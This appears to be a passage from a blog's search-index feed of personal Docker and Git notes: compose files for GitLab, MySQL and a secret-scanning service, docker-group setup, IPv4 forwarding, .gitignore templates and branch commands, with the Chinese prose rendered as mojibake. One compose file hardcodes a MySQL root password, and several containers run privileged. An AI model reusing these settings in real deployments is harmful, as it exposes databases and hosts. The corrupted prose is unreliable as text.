/usr/share/nginx/html/dist</p></li></ol><h1 id="åˆ é™¤noneé•œåƒ"><a href="#åˆ é™¤noneé•œåƒ" class="headerlink" title="åˆ é™¤noneé•œåƒ"></a>åˆ é™¤noneé•œåƒ</h1><pre><code>docker images -a | grep &quot;&lt;none&gt;&quot; | awk &#39;&#123;print $3&#125;&#39; | xargs docker rmi</code></pre>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>gitlab EEå®ä¾‹</title>
      <link href="/2024/04/09/docker/dockerfile%EF%BC%9Agitlab%20EE%E5%AE%9E%E4%BE%8B/"/>
      <url>/2024/04/09/docker/dockerfile%EF%BC%9Agitlab%20EE%E5%AE%9E%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<pre><code>version: &#39;3.8&#39;services:gitlab:    image: &#39;gitlab/gitlab-ee:15.3.5-ee.0&#39;    container_name: &#39;gitlab-ee&#39;    restart: always    hostname: 192.168.3.199    privileged: true    shm_size: &#39;2gb&#39;    environment:    GITLAB_OMNIBUS_CONFIG: |        external_url &#39;http://192.168.3.199:40080&#39;        gitlab_rails[&#39;gitlab_shell_ssh_port&#39;] = 40022    ports:    - 40080:40080    - 40443:40443    - &quot;40022:22&quot;    volumes:    - &#39;./storage/config:/etc/gitlab&#39;    - &#39;./storage/logs:/var/log/gitlab&#39;    - &#39;./storage/data:/var/opt/gitlab&#39;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>åªèƒ½æœ‰rootæ“ä½œdockerï¼Œæ™®é€šç”¨æˆ·æ— æ³•æ“ä½œdockerså¤„ç†æ–¹æ³•</title>
      <link href="/2024/04/09/docker/docker%E5%85%81%E8%AE%B8%E9%9D%9Eroot/"/>
      <url>/2024/04/09/docker/docker%E5%85%81%E8%AE%B8%E9%9D%9Eroot/</url>
      
        <content type="html"><![CDATA[<p>å‚è€ƒé“¾æ¥: <a href="https://www.cnblogs.com/-mrl/p/13836631.html">https://www.cnblogs.com/-mrl/p/13836631.html</a></p><p>çœ‹å½“å‰ç³»ç»Ÿä¸­çš„ç”¨æˆ·å’Œç»„ï¼š</p><pre><code>1ã€ç”¨æˆ·åˆ—è¡¨æ–‡ä»¶ï¼šcat /etc/passwd2ã€ç”¨æˆ·ç»„åˆ—è¡¨æ–‡ä»¶ï¼šcat /etc/group</code></pre><h1 id="åˆ›å»ºdockerç»„"><a href="#åˆ›å»ºdockerç»„" class="headerlink" title="åˆ›å»ºdockerç»„"></a>åˆ›å»ºdockerç»„</h1><pre><code>vagrant@ubuntu18:~$ sudo groupadd dockergroupadd: group â€˜dockerâ€˜ already exists</code></pre><h1 id="å°†å½“å‰ç”¨æˆ·åŠ å…¥dockerç»„"><a href="#å°†å½“å‰ç”¨æˆ·åŠ å…¥dockerç»„" class="headerlink" title="å°†å½“å‰ç”¨æˆ·åŠ å…¥dockerç»„"></a>å°†å½“å‰ç”¨æˆ·åŠ å…¥dockerç»„</h1><pre><code>vagrant@ubuntu18:~$ sudo gpasswd -a $&#123;USER&#125; dockerAdding user xxx to group docker</code></pre><h1 id="é‡å¯dockeræœåŠ¡"><a href="#é‡å¯dockeræœåŠ¡" class="headerlink" title="é‡å¯dockeræœåŠ¡"></a>é‡å¯dockeræœåŠ¡</h1><pre><code>vagrant@ubuntu18:~$ sudo service docker restart</code></pre><h1 id="åˆ·æ–°dockerç»„æˆå‘˜"><a href="#åˆ·æ–°dockerç»„æˆå‘˜" class="headerlink" title="åˆ·æ–°dockerç»„æˆå‘˜"></a>åˆ·æ–°dockerç»„æˆå‘˜</h1><pre><code>vagrant@ubuntu18:~$ newgrp docker#å†è¯•è¯•å‘½ä»¤^_^vagrant@ubuntu18:~$ docker imagesREPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</code></pre><p>ç„¶åå½“å‰çš„shellé€€äº†é‡æ–°å¼€ä¸€ä¸ªï¼Œè¿™æ ·ä½ ç›®å‰çš„ç”¨æˆ·å°±å¯ä»¥æ“ä½œdocker images å‘½ä»¤ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>chown cannot dereference</title>
      <link href="/2024/04/09/docker/mysql-chown-err/"/>
      <url>/2024/04/09/docker/mysql-chown-err/</url>
      
        <content type="html"><![CDATA[<p>ç–‘éš¾æ‚ç—‡ï¼šæ‹·è´mysqlåŸå§‹ç›®å½•åˆ°å…¶ä»–ç›®å½•ï¼ŒæŠ¥é”™</p><pre><code>chown: cannot dereference &#39;/var/lib/mysql/mysql.sock&#39;: No such file or directory</code></pre><p>æ¨¡ä»¿æ­¤è´´<br><a href="https://github.com/docker-library/mysql/issues/939">https://github.com/docker-library/mysql/issues/939</a></p><p><img src="/2024/04/09/docker/mysql-chown-err/2024-04-10-21-36-32.png" alt="2024-04-10-21-36-32"></p><p>è§£å†³</p><p>åŸå› æ˜¯å¤åˆ¶dockeræ•°æ®è¿‡æ¥çš„æ—¶å€™æ²¡æœ‰ä¿æŒåŸå…ˆæ–‡ä»¶çš„chownå±æ€§</p><p>ä¸éœ€è¦è®¾ç½®privileged: true  # å…è®¸ç‰¹æƒæ¨¡å¼ å±æ€§</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql-docker</title>
      <link href="/2024/04/09/docker/mysql-docker/"/>
      <url>/2024/04/09/docker/mysql-docker/</url>
      
        <content type="html"><![CDATA[<p>mysqlçš„dockerï¼š<a href="https://registry.hub.docker.com/_/mysql">https://registry.hub.docker.com/_/mysql</a></p><p>æˆ‘çš„æ–‡ä»¶åç§°æ˜¯docker-compose-basic.yml,MySQLæ•°æ®æŒ‚è½½åˆ°å®¿ä¸»æœº/root/basic/mysqlä¸‹</p><p>æ•°æ®åº“ä¸€èˆ¬éœ€è¦å°†æ•°æ®æŒ‚è½½åˆ°å®¿ä¸»æœºä¸Š,ä»¥å…å®¹å™¨æŸåå¯¼è‡´æ•°æ®ä¸¢å¤±</p><pre><code>version: &#39;3&#39;services:#mysqlmysql:    image: mysql:5.6    container_name: mysql    environment:    - MYSQL_ROOT_PASSWORD=1qaz@WSX    - TZ=Asia/Shanghai    - SET_CONTAINER_TIMEZONE=true    - CONTAINER_TIMEZONE=Asia/Shanghai    volumes:    - ./mysql/conf:/etc/mysql/conf.d    - ./mysql/conf:/etc/mysql/mysql.conf.d    - ./mysql/data:/var/lib/mysql    - ./mysql/logs:/var/log/mysql    - /etc/localtime:/etc/localtime:ro    ports:    - 13306:3306    restart: always</code></pre><p>å…³äºä¿®æ”¹é…ç½®æ–‡ä»¶my.cnf(ç±»ä¼¼äºmy.ini)è¿™ç§æ–‡ä»¶ï¼Œä¸Šé¢å·²ç»æŒ‡å‘äº†/etc/mysql/mysql.conf.då’Œ/etc/mysql/conf.dä¸¤å¤„é…ç½®æ–‡ä»¶çš„ç›®å½•ï¼Œä½†æ˜¯å®Œå…¨å¯ä»¥åœ¨ä¸Šé¢çš„æŒ‚è½½ç›®å½•ä¸‹æ–°å»ºmy.cnfã€‚å› ä¸ºæˆ‘ä»¬çš„cnfæ–‡ä»¶ä¹Ÿæ˜¯é…ç½®æ–‡ä»¶ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å¼€å¯ipv4è½¬å‘</title>
      <link href="/2024/04/09/docker/%E5%BC%80%E5%90%AFipv4%E8%BD%AC%E5%8F%91/"/>
      <url>/2024/04/09/docker/%E5%BC%80%E5%90%AFipv4%E8%BD%AC%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<h1 id="æ— æ³•è®¿é—®åˆ°dockeræ˜ å°„å‡ºæ¥çš„ç«¯å£"><a href="#æ— æ³•è®¿é—®åˆ°dockeræ˜ å°„å‡ºæ¥çš„ç«¯å£" class="headerlink" title="æ— æ³•è®¿é—®åˆ°dockeræ˜ å°„å‡ºæ¥çš„ç«¯å£"></a>æ— æ³•è®¿é—®åˆ°dockeræ˜ å°„å‡ºæ¥çš„ç«¯å£</h1><p>ä¸´æ—¶å¼€å¯ipv4è½¬å‘</p><pre><code>echo 1 &gt;/proc/sys/net/ipv4/ip_forward</code></pre><p>å¹¶é‡å¯dockeræœåŠ¡</p><pre><code>service docker restart</code></pre><p>æ°¸ä¹…å¼€å¯è·¯ç”±åŠŸèƒ½</p><pre><code>vim /etc/sysctl.confnet.ipv4.ip_forward = 1</code></pre><p>ç„¶åå®¹å™¨å†…ä¹Ÿèƒ½ä¸Šç½‘äº†</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ„å»ºblingTrendsAPIServer</title>
      <link href="/2024/04/09/docker/%E6%9E%84%E5%BB%BAblingTrendsAPIServer/"/>
      <url>/2024/04/09/docker/%E6%9E%84%E5%BB%BAblingTrendsAPIServer/</url>
      
        <content type="html"><![CDATA[<p>amd64/alpine:3.14è¶³å¤Ÿå°</p><pre><code>FROM amd64/alpine:3.14ADD . /api-server/RUN apk update &amp;&amp; apk add tzdata &amp;&amp; cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime &amp;&amp; echo &quot;Asia/Shanghai&quot; &gt; /etc/timezone &amp;&amp; apk del tzdata &amp;&amp; apk add --update --no-cache python3 py3-pip &amp;&amp; python3 -m pip install -r /api-server/requirements.txtWORKDIR /api-serverEXPOSE 5000ENTRYPOINT [&quot;python3&quot;, &quot;/api-server/blingTrendsAPIServer.py&quot;]</code></pre><p>æ¨èdockerfileéƒ¨ç½²ï¼Œç›®å‰å·²éƒ¨ç½²åœ¨192.168.3.203:5000ã€‚</p><p>é»˜è®¤ä½¿ç”¨5000ç«¯å£ï¼Œè‡ªè¡Œè€ƒè™‘é˜²ç«å¢™ç«¯å£å¼€æ”¾ï¼Œå¦‚ubuntuä½¿ç”¨<code>sudo ufw allow 5000/tcp</code>æ”¾å¼€ç«¯å£ï¼›</p><p>ç›®å‰è¿æ¥æ•°æ®åº“æ˜¯<code>192.168.3.203:23306</code>ï¼Œdockeré»˜è®¤bridgeæ¨¡å¼ï¼Œè¦è®¿é—®203æ•°æ®åº“éœ€è¦<code>sudo ufw allow 23306/tcp</code></p><p>å¦‚æœéœ€è¦æŒ‡å®šç«¯å£æ˜ å°„ï¼Œè‡ªè¡Œæ›´æ”¹å‚æ•°<code>docker run -p &lt;host-port&gt;:&lt;container-port&gt; &lt;image-name&gt;</code></p><pre><code># æ„å»ºåå¤§å°ä¸º77.5MBdocker build -t bling-trends-server .# è¿è¡Œå‘½ä»¤docker run --name bling_trends_server_container -itd -p 5000:5000 bling-trends-server</code></pre>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ„å»ºgitleaks-DockeræœåŠ¡</title>
      <link href="/2024/04/09/docker/%E7%BA%AFdocker-compose%E6%97%A0dockerfile%EF%BC%9A%E6%9E%84%E5%BB%BAgitleaks-Docker%E6%9C%8D%E5%8A%A1/"/>
      <url>/2024/04/09/docker/%E7%BA%AFdocker-compose%E6%97%A0dockerfile%EF%BC%9A%E6%9E%84%E5%BB%BAgitleaks-Docker%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<p>åœ¨ä¸Šé¢gitleaksçš„docker-compose+Dockerfileçš„ç»„åˆä¹‹åï¼Œæˆ‘æƒ³å†™ä¸ªçº¯docker-composeæ— dockerfileçš„ç‰ˆæœ¬ã€‚</p><p>å³ä½¿ç”¨docker-composeå®Œå…¨æ›¿ä»£Dockerfileã€‚</p><p>docker-compose</p><p>entrypointä¸å¥½ç”¨ï¼Œæˆ‘æŸ¥é˜…èµ„æ–™è¯´æ˜¯ç±»ä¼¼äºDockerfileçš„RUNï¼Œåœ¨å®¹å™¨å¯åŠ¨ä¹‹å‰çš„æ„ä»¶ä¸­ä¼šè¿è¡Œï¼Œä½†æ˜¯æ€ä¹ˆæµ‹è¯•éƒ½ä¸å¯¹ã€‚</p><p>å¹²è„†æŠŠRUNä¸­çš„å‘½ä»¤å†™åˆ°æœ€åçš„commandæ„å»ºå‘½ä»¤ä¸­ã€‚<br>æ¶‰åŠcommandå‘½ä»¤ï¼Œæ³¨æ„ä½¿ç”¨docker-compose logsçœ‹æ—¥å¿—ï¼Œæœ‰å¯èƒ½æ— é™é‡å¤è¿è¡Œcommandå‘½ä»¤</p><pre><code>version: &quot;3&quot;services:secretdetection_docker:    image: amd64/alpine:3.14    # entrypoint: [&quot;/secretDetection/entrypoint.sh&quot;]    # entrypoint: &quot;/bin/sh -c &quot;apk update &amp;&amp; apk add git &amp;&amp; apk add tzdata &amp;&amp; cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime &amp;&amp; echo &quot;Asia/Shanghai&quot; &gt; /etc/timezone &amp;&amp; apk del tzdata&quot;    container_name: secret_detection_http    ports:    - &quot;8000:8000&quot;    restart: always    volumes:    - ./SecretDetectionDir:/secretDetection/    restart: always    working_dir: /secretDetection/    # command: /secretDetection/http    command: /bin/sh -c &quot;apk update &amp;&amp; apk add git &amp;&amp; apk add tzdata &amp;&amp; cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime &amp;&amp; echo &quot;Asia/Shanghai&quot; &gt; /etc/timezone &amp;&amp; apk del tzdata &amp;&amp; /secretDetection/http&quot;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>.gitignore</title>
      <link href="/2024/04/09/git/gitignore/"/>
      <url>/2024/04/09/git/gitignore/</url>
      
        <content type="html"><![CDATA[<p>å®˜æ–¹æ–‡æ¡£ï¼š<code>https://github.com/github/gitignore</code></p><h3 id="æˆ‘çš„-gitignoreæ¨¡æ¿"><a href="#æˆ‘çš„-gitignoreæ¨¡æ¿" class="headerlink" title="æˆ‘çš„.gitignoreæ¨¡æ¿"></a>æˆ‘çš„.gitignoreæ¨¡æ¿</h3><pre><code># Logslogs*.lognpm-debug.log*yarn-debug.log*yarn-error.log*pnpm-debug.log*lerna-debug.log*node_modulesdistdist-ssr*.local# big files*.mp4backend/volume/media/documents/*!backend/volume/media/documents/.gitkeepbackend/volume/media/import_excel_upload/*!backend/volume/media/import_excel_upload/.gitkeepbackend/volume/media/videos/*!backend/volume/media/videos/.gitkeep# python**/__pycache__/**.pyc# å¿½ç•¥pycharm**/.idea/# å¿½ç•¥è™šæ‹Ÿç¯å¢ƒ**/venv# Editor directories and files**/.vscode/*!.vscode/extensions.json.idea.DS_Store*.suo*.ntvs**.njsproj*.sln*.sw?</code></pre><h3 id="å…¶ä»–ç¤ºä¾‹"><a href="#å…¶ä»–ç¤ºä¾‹" class="headerlink" title="å…¶ä»–ç¤ºä¾‹"></a>å…¶ä»–ç¤ºä¾‹</h3><pre><code># å¿½ç•¥æ‰€æœ‰ .a ç»“å°¾çš„æ–‡ä»¶a# ä½†lib.a é™¤å¤–!lib.a# ä»…ä»…å¿½ç•¥é¡¹ç›®æ ¹ç›®å½•ä¸‹çš„ TODO æ–‡ä»¶ï¼Œä¸åŒ…æ‹¬ subdir/TODO/TODO# å¿½ç•¥build/ ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶build/# ä¼šå¿½ç•¥ doc/notes.txt ä½†ä¸åŒ…æ‹¬ doc/server/arch.txtdoc/.txt</code></pre>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>keep empty directory in git</title>
      <link href="/2024/04/09/git/gitkeep/"/>
      <url>/2024/04/09/git/gitkeep/</url>
      
        <content type="html"><![CDATA[<p>ç›®å½•ä¸­æ–°å»ºç©ºæ–‡ä»¶ <strong>.gitkeep</strong> å³å¯</p>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è¿œç¨‹è·å–æ‰€æœ‰åˆ†æ”¯</title>
      <link href="/2024/04/09/git/%E4%BB%8E%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E5%88%86%E6%94%AF/"/>
      <url>/2024/04/09/git/%E4%BB%8E%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E5%88%86%E6%94%AF/</url>
      
        <content type="html"><![CDATA[<pre><code>git clone xxxcd xxxgit branch -r | grep -v &#39;\-&gt;&#39; | while read remote; do git branch --track &quot;$&#123;remote#origin/&#125;&quot; &quot;$remote&quot;; donegit fetch --allgit pull --all(git pull â€“allåœ¨åŠŸèƒ½ä¸ŠåŒ…å«git fetch --all)</code></pre>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>merge conflict</title>
      <link href="/2024/04/09/git/%E5%86%B2%E7%AA%81%E8%A7%A3%E5%86%B3/"/>
      <url>/2024/04/09/git/%E5%86%B2%E7%AA%81%E8%A7%A3%E5%86%B3/</url>
      
        <content type="html"><![CDATA[<p>git pushæç¤ºå†²çª</p><p><img src="/2024/04/09/git/%E5%86%B2%E7%AA%81%E8%A7%A3%E5%86%B3/2024-04-09-19-47-59.png" alt="2024-04-09-19-47-59"></p><p>ä¼šåœ¨æºæ–‡ä»¶ä¸­çœ‹åˆ°æ ‡è®°çš„å†²çªçš„HEAD</p><p><img src="/2024/04/09/git/%E5%86%B2%E7%AA%81%E8%A7%A3%E5%86%B3/2024-04-09-19-48-22.png" alt="2024-04-09-19-48-22"></p><p>ä¿®æ”¹å®Œåœ¨git add . å†commit push</p><p>å¦‚æœæ²¡æœ‰å®è´¨å·®å¼‚ï¼Œâ€œcurrent changeâ€æ˜¯ä½ çš„ä¿®æ”¹çš„ï¼Œé‚£ä¸ªcommit idçš„æ˜¯å·²å­˜åœ¨çš„ï¼ŒæŒ‰ç…§å·²å­˜åœ¨çš„æ¥</p><h3 id="git-stash"><a href="#git-stash" class="headerlink" title="git stash"></a>git stash</h3><pre><code>git stashgit commitgit stash pop</code></pre><p>æ¥ä¸‹æ¥diffä¸€ä¸‹æ­¤æ–‡ä»¶çœ‹çœ‹è‡ªåŠ¨åˆå¹¶çš„æƒ…å†µï¼Œå¹¶ä½œå‡ºç›¸åº”ä¿®æ”¹ã€‚</p><p>git stash: å¤‡ä»½å½“å‰çš„å·¥ä½œåŒºçš„å†…å®¹ï¼Œä»æœ€è¿‘çš„ä¸€æ¬¡æäº¤ä¸­è¯»å–ç›¸å…³å†…å®¹ï¼Œè®©å·¥ä½œåŒºä¿è¯å’Œä¸Šæ¬¡æäº¤çš„å†…å®¹ä¸€è‡´ã€‚åŒæ—¶ï¼Œå°†å½“å‰çš„å·¥ä½œåŒºå†…å®¹ä¿å­˜åˆ°Gitæ ˆä¸­ã€‚</p><p>git stash pop: ä»Gitæ ˆä¸­è¯»å–æœ€è¿‘ä¸€æ¬¡ä¿å­˜çš„å†…å®¹ï¼Œæ¢å¤å·¥ä½œåŒºçš„ç›¸å…³å†…å®¹ã€‚ç”±äºå¯èƒ½å­˜åœ¨å¤šä¸ªStashçš„å†…å®¹ï¼Œæ‰€ä»¥ç”¨æ ˆæ¥ç®¡ç†ï¼Œpopä¼šä»æœ€è¿‘çš„ä¸€ä¸ªstashä¸­è¯»å–å†…å®¹å¹¶æ¢å¤ã€‚</p><p>git stash list: æ˜¾ç¤ºGitæ ˆå†…çš„æ‰€æœ‰å¤‡ä»½ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªåˆ—è¡¨æ¥å†³å®šä»é‚£ä¸ªåœ°æ–¹æ¢å¤ã€‚</p><p>git stash clear: æ¸…ç©ºGitæ ˆã€‚æ­¤æ—¶ä½¿ç”¨gitgç­‰å›¾å½¢åŒ–å·¥å…·ä¼šå‘ç°ï¼ŒåŸæ¥stashçš„å“ªäº›èŠ‚ç‚¹éƒ½æ¶ˆå¤±äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>branch</title>
      <link href="/2024/04/09/git/%E5%88%86%E6%94%AF%E6%93%8D%E4%BD%9C/"/>
      <url>/2024/04/09/git/%E5%88%86%E6%94%AF%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#æŸ¥çœ‹åˆ†æ”¯">æŸ¥çœ‹åˆ†æ”¯</a><ul><li><a href="#åˆ—å‡ºæœ¬åœ°æ‰€æœ‰çš„åˆ†æ”¯">åˆ—å‡ºæœ¬åœ°æ‰€æœ‰çš„åˆ†æ”¯</a></li><li><a href="#åˆ†æ”¯åˆå¹¶è¡Œä¸ºå¯è§†åŒ–">åˆ†æ”¯åˆå¹¶è¡Œä¸ºå¯è§†åŒ–</a></li><li><a href="#æŸ¥çœ‹åˆ†æ”¯ä¸è¿œç¨‹çš„å…³è”">æŸ¥çœ‹åˆ†æ”¯ä¸è¿œç¨‹çš„å…³è”</a></li><li><a href="#æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯">æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯</a></li></ul></li><li><a href="#åˆ‡æ¢åˆ†æ”¯">åˆ‡æ¢åˆ†æ”¯</a></li><li><a href="#detached-head-å’Œ-checkout-commitç„¶åä¿®æ”¹å…¥æ–°branch">Detached HEAD å’Œ checkout commitç„¶åä¿®æ”¹å…¥æ–°branch</a></li></ul><h1 id="æŸ¥çœ‹åˆ†æ”¯"><a href="#æŸ¥çœ‹åˆ†æ”¯" class="headerlink" title="æŸ¥çœ‹åˆ†æ”¯"></a>æŸ¥çœ‹åˆ†æ”¯</h1><h3 id="åˆ—å‡ºæœ¬åœ°æ‰€æœ‰çš„åˆ†æ”¯"><a href="#åˆ—å‡ºæœ¬åœ°æ‰€æœ‰çš„åˆ†æ”¯" class="headerlink" title="åˆ—å‡ºæœ¬åœ°æ‰€æœ‰çš„åˆ†æ”¯"></a>åˆ—å‡ºæœ¬åœ°æ‰€æœ‰çš„åˆ†æ”¯</h3><pre><code>git branch </code></pre><p>æŸ¥çœ‹åˆ†æ”¯è¯¦ç»†ä¿¡æ¯ï¼Œåˆ—å‡ºæœ¬åœ°æ‰€æœ‰çš„åˆ†æ”¯, + hash ä¿¡æ¯</p><pre><code>git branch -v</code></pre><h3 id="åˆ†æ”¯åˆå¹¶è¡Œä¸ºå¯è§†åŒ–"><a href="#åˆ†æ”¯åˆå¹¶è¡Œä¸ºå¯è§†åŒ–" class="headerlink" title="åˆ†æ”¯åˆå¹¶è¡Œä¸ºå¯è§†åŒ–"></a>åˆ†æ”¯åˆå¹¶è¡Œä¸ºå¯è§†åŒ–</h3><p>ä¸ºäº†æ–¹ä¾¿æŸ¥çœ‹åˆ†æ”¯æ¥æºï¼Œæ¯”å¦‚å¤§å‹é¡¹ç›®é€šå¸¸ä¼šæœ‰å¤šä¸ªåˆ†æ”¯ä»¥åŠåˆ†æ”¯åˆå¹¶çš„è¡Œä¸ºï¼Œå•çº¯çš„ä½¿ç”¨ç»ˆç«¯æŸ¥çœ‹åˆ†æ”¯æ¥æºã€logå¹¶ä¸ç›´è§‚ã€‚å¦‚æœå‘ç”Ÿåˆ†æ”¯åˆå¹¶çš„å¼‚å¸¸è¡Œä¸ºï¼Œéœ€è¦æº¯æºï¼Œç›´è§‚çš„è§‚å¯Ÿgitåˆ†æ”¯æ˜¯å¿…é¡»çš„ä¸€ä¸ªå®¡è®¡è¡Œä¸ºã€‚</p><p>æˆ‘çœ‹æœ‰æ¨è<code>github desktop</code>, <code>source tree</code>å’Œ<code>GitKraken</code>(æ”¶è´¹)ï¼Œä½†æ˜¯ä¹‹å‰ä¸Šç­çš„æ—¶å€™çœ‹å¸ˆå‚…ç”¨çš„<strong>IDEA GITåˆ†æ”¯å›¾</strong>ä¹Ÿæœ‰ä¸é”™çš„æ•ˆæœï¼ŒåŸºæœ¬Jetbrainçš„æ‰€æœ‰IDEéƒ½æœ‰è¿™ä¸ªæ’ä»¶ã€‚ç‚¹å‡»èœå•æ çš„<code>git</code>-&gt;<code>log</code>ã€‚</p><p><img src="/2024/04/09/git/%E5%88%86%E6%94%AF%E6%93%8D%E4%BD%9C/pycharm_git_log.png" alt="pycharm_git_log"></p><h3 id="æŸ¥çœ‹åˆ†æ”¯ä¸è¿œç¨‹çš„å…³è”"><a href="#æŸ¥çœ‹åˆ†æ”¯ä¸è¿œç¨‹çš„å…³è”" class="headerlink" title="æŸ¥çœ‹åˆ†æ”¯ä¸è¿œç¨‹çš„å…³è”"></a>æŸ¥çœ‹åˆ†æ”¯ä¸è¿œç¨‹çš„å…³è”</h3><p><code>git branch -vv</code> #åˆ—å‡ºæœ¬åœ°æ‰€æœ‰çš„åˆ†æ”¯, + hash ä¿¡æ¯ + ä¸è¿œç¨‹çš„å…³è”ä¿¡æ¯</p><p>è™½ç„¶é»˜è®¤æœ¬åœ°å’Œè¿œç¨‹å¤§éƒ¨åˆ†éƒ½æ˜¯åŒåçš„, ä½†æ˜¯åœ¨å¤šåˆ†æ”¯çš„åœºæ™¯ä¸‹è¿˜æ˜¯ä¼šå‡ºç°ä¸åŒåçš„æƒ…å†µ<br>é€šè¿‡è¿™ä¸ªå‘½ä»¤è¿›è¡Œç¡®è®¤, éå¸¸å¥½ç”¨.</p><h3 id="æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯"><a href="#æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯" class="headerlink" title="æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯"></a>æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯</h3><h1 id="åˆ—å‡ºæ‰€æœ‰çš„åˆ†æ”¯-è¿œç¨‹å’Œæœ¬åœ°-è¿™ä¸ªå‘½ä»¤åœ¨æ‹‰å–åˆ«äººçš„åˆ†æ”¯çš„æ—¶å€™éå¸¸æœ‰ç”¨-æ¯”å¦‚"><a href="#åˆ—å‡ºæ‰€æœ‰çš„åˆ†æ”¯-è¿œç¨‹å’Œæœ¬åœ°-è¿™ä¸ªå‘½ä»¤åœ¨æ‹‰å–åˆ«äººçš„åˆ†æ”¯çš„æ—¶å€™éå¸¸æœ‰ç”¨-æ¯”å¦‚" class="headerlink" title="åˆ—å‡ºæ‰€æœ‰çš„åˆ†æ”¯(è¿œç¨‹å’Œæœ¬åœ°)è¿™ä¸ªå‘½ä»¤åœ¨æ‹‰å–åˆ«äººçš„åˆ†æ”¯çš„æ—¶å€™éå¸¸æœ‰ç”¨, æ¯”å¦‚"></a>åˆ—å‡ºæ‰€æœ‰çš„åˆ†æ”¯(è¿œç¨‹å’Œæœ¬åœ°)è¿™ä¸ªå‘½ä»¤åœ¨æ‹‰å–åˆ«äººçš„åˆ†æ”¯çš„æ—¶å€™éå¸¸æœ‰ç”¨, æ¯”å¦‚</h1><pre><code>git branch -agit branch -a | grep xxx</code></pre><h1 id="åˆ‡æ¢åˆ†æ”¯"><a href="#åˆ‡æ¢åˆ†æ”¯" class="headerlink" title="åˆ‡æ¢åˆ†æ”¯"></a>åˆ‡æ¢åˆ†æ”¯</h1><pre><code># `-b` means create a new branchgit checkout -b new-branch-namegit checkout &lt;commit-hash&gt;</code></pre><h1 id="Detached-HEAD-å’Œ-checkout-commitç„¶åä¿®æ”¹å…¥æ–°branch"><a href="#Detached-HEAD-å’Œ-checkout-commitç„¶åä¿®æ”¹å…¥æ–°branch" class="headerlink" title="Detached HEAD å’Œ checkout commitç„¶åä¿®æ”¹å…¥æ–°branch"></a>Detached HEAD å’Œ checkout commitç„¶åä¿®æ”¹å…¥æ–°branch</h1><p>In Git, a <strong>detached HEAD</strong> state occurs when you are working directly on <strong>a specific commit(not the lastest)</strong> rather than on <strong>the latest commit</strong> of a branch. This can happen when you <strong>checkout a commit, a tag, or a remote branch</strong> directly, without creating a new branch.</p><p><strong>HEAD</strong> is a <code>pointer</code> in Git that typically points to the latest commit on the current branch.</p>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>delete something useless before gitignore</title>
      <link href="/2024/04/09/git/%E5%88%A0%E9%99%A4gitignore%E4%B9%8B%E5%89%8D%E7%9A%84ignore%E6%96%87%E4%BB%B6/"/>
      <url>/2024/04/09/git/%E5%88%A0%E9%99%A4gitignore%E4%B9%8B%E5%89%8D%E7%9A%84ignore%E6%96%87%E4%BB%B6/</url>
      
